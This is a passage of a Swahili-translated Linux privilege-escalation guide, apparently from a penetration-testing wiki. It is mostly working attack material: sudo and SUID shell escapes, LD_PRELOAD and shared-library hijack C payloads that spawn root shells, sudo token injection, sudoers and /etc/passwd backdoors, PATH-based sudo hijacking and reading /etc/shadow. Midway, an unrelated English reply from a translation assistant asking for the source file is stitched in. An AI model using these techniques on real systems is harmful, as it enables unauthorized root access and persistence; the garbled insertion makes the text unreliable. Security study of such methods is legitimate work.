cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kupandisha mamlaka. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambacho kinaweza kukupa mamlaka za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zilizojulikana

Kama unajua nywila yoyote ya mazingira, jaribu kuingia kama kila mtumiaji ukitumia nywila hiyo.

### Su Brute

Kama haufikiri shida kwa kusababisha kelele nyingi na binaries `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameter `-a` pia hujaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Kama ugundua kwamba unaweza **kuandika ndani ya baadhi ya folda za $PATH**, unaweza kufanikiwa kuongeza vibali kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri itakayotekelezwa na mtumiaji mwingine (kwa mfano root) na ambayo **haitachukuliwa kutoka kwenye folda iliyoko kabla ya folda yako inayoweza kuandikwa katika $PATH**.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya sudo yanaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa `ssh` katika saraka ya `root` au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Direktivu hii inamruhusu mtumiaji **kuweka kigezo cha mazingira** wakati anapoendesha kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, **ulikuwa dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Njia za kukwepa utekelezaji wa Sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi hata zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kutaja njia yake (daima angalia kwa kutumia** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kutaja njia**, basi, unaweza kujaribu **export a function** iitwayo kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_, lazima ujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapokuita suid binary, kazi hii itatekelezwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubainisha maktaba moja au zaidi za kushirikiwa (.so files) ambazo zitapakiwa na loader kabla ya nyingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading ya maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables za **suid/sgid**, mfumo unatekeleza masharti fulani:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba tu zilizopo katika njia za kawaida ambazo pia ni suid/sgid ndizo hupakiwa kabla.

Kuongezeka kwa mamlaka kunaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu kigezo cha mazingira **LD_PRELOAD** kudumu na kutambuliwa hata amri zinapotekelezwa kwa `sudo`, jambo ambalo linaweza kupelekea utekelezaji wa msimbo wowote kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **ijenge** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Mwishowe, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu anadhibiti njia ambayo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambayo inaonekana isiyo ya kawaida, ni desturi nzuri kukagua ikiwa inaingiza mafaili ya **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

To exploit this, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Code hii, mara compiled na executed, inalenga elevate privileges kwa manipulating file permissions na executing shell yenye elevated privileges.

Compile C file iliyo hapo juu kuwa shared object (.so) file kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha SUID binary iliyoathiriwa kunapaswa kuchochea exploit, na hivyo kuruhusu uwezekano wa kuvamiwa kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeipata SUID binary inayopakia library kutoka kwenye folder ambapo tunaweza kuandika, tuunde library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Iwapo utapata hitilafu kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyotengeneza inapaswa kuwa na kazi inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya binaries za Unix ambazo mshambuliaji anaweza kuzitumia kuvuka vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi huu hukusanya kazi halali za binaries za Unix ambazo zinaweza kutumika vibaya ili kutoroka restricted shells, escalate au kudumisha elevated privileges, kuhamisha files, kuzalisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia kama inapata jinsi ya ku-exploit kanuni yoyote ya sudo.

### Kutumia Tena Tokeni za Sudo

Katika kesi ambapo una **sudo access** lakini huna nenosiri, unaweza escalate privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha ku-hijack session token**.

Mahitaji ya ku-escalate privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame**tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi hilo ndilo muda wa sudo token ambalo linaturuhusu kutumia `sudo` bila kuingiza nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kwa muda kuwasha `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yamekamilika, **unaweza escalate privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha sudo token kwenye session yako** (hutaipata root shell moja kwa moja; tumia `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda sudoers file** ambayo inafanya **sudo tokens kuwa za milele na inaruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Iwapo una **idhinishaji za kuandika** kwenye folda au kwenye yoyote ya faili zilizotengenezwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa user na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata idhinishaji za sudo** bila kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi. **Faili hizi kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Kama** unaweza **kusoma** faili hii utaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Kama unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa ya binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huungana na mashine na hutumia `sudo`** kuongeza idhini na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza msimbo wako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya katika .bash_profile) ili wakati mtumiaji anapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (siyo bash) utahitaji kubadilisha faili nyingine ili kuongeza njia mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **ambapo faili za usanidi zinazopakiwa zinatoka**. Kwa kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaonyesha folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Iwapo kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye moja ya njia zilizoainishwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuweza kupandisha ruhusa.\
Angalia **jinsi ya kutumia mipangilio hii isiyo sahihi** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/`, itatumika na programu mahali hapa kama ilivyoainishwa katika `RPATH` variable.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities zinatoa **sehemu ndogo ya idhini za root zinazopatikana kwa mchakato**. Hii kwa ufanisi huvunja idhini za root **kuwa vitengo vidogo na vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kisha kutolewa kwa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya idhini inapunguzwa, ikipunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia kwa ubaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Kwenye saraka, **bit ya "execute"** inaashiria kwamba mtumiaji anayehusika anaweza "**cd**" ndani ya folda.\
**"read"** bit inaonyesha mtumiaji anaweza **list** **files**, na **"write"** bit inaonyesha mtumiaji anaweza **delete** na **create** files mpya.

## ACLs

Access Control Lists (ACLs) zinaonyesha tabaka la pili la ruhusa za hiari, zikiwa na uwezo wa **overriding the traditional ugo/rwx permissions**. Ruhusa hizi zinaboresha udhibiti juu ya ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **granularity kinahakikisha usimamizi wa ufikiaji wenye usahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** files with specific ACLs from the system:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji tofauti (**root**).\
Katika **matoleo mapya** utaweza **connect** tu kwa screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo na **toleo za zamani za tmux**. Sikuweza kufanya hijack ya kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Kosa hili linasababishwa wakati wa kuunda ssh key mpya kwenye OS hizo, kwa kuwa **mabadiliko yaliyowezekana yalikuwa ni 32,768 tu**. Hii ina maana kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliokadiriwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Viwango vya usanidi vinavyovutia

- **PasswordAuthentication:** Inaonyesha kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaonyesha kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Iwapo password authentication imeruhusiwa, inaonyesha kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaonyesha kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: root anaweza kuingia kwa kutumia private key pekee na ikiwa options za commands zimeainishwa
- `no` : hapana

### AuthorizedKeysFile

Inaonyesha mafaili yanayoshikilia public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitatumika kubadilishwa na directory ya nyumbani. **Unaweza kuonyesha njia kamili (absolute paths)** (kuanzia katika `/`) au **njia zinazohusiana kutoka kwenye nyumbani kwa mtumiaji**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inaruhusu **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko ndani ya **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohama kwenda kwenye mashine tofauti, host hiyo itaweza kupata funguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubadilisha** **chaguo** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno kuu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwa sababu **pengine unaweza kuitumia vibaya ili kupandisha hadhi za ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za profile

Faili `/etc/profile` na faili zilizo ndani ya `/etc/profile.d/` ni **scripti zinazotekelezwa wakati mtumiaji anapofungua shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kupandisha hadhi za ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti yoyote ya profaili isiyo ya kawaida inapatikana, unapaswa kuikagua ili kutafuta **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zina jina tofauti au kunaweza kuwa na nakala ya chelezo. Kwa hiyo inashauriwa **kutafuta zote** na **kukagua kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au faili sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nenosiri kwa moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the README.md text you want translated.

Also confirm:
- Do you want me to generate a strong password now and include it in the output?
- Which Linux distro/target should the "add user" commands target (Debian/Ubuntu vs RHEL/CentOS), or do you want generic commands?

Once you provide the file (and answers), I'll translate the relevant English text to Swahili (keeping markdown/html tags, links and code unchanged) and append commands to add the user `hacker` with the generated password.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` ukiwa na `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: hii inaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kuhariri faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kuhariri mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara inayofuata tomcat itakapowashwa.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Inawezekana hutaweza kusoma ile ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi karibuni
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB faili
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafaili
```bash
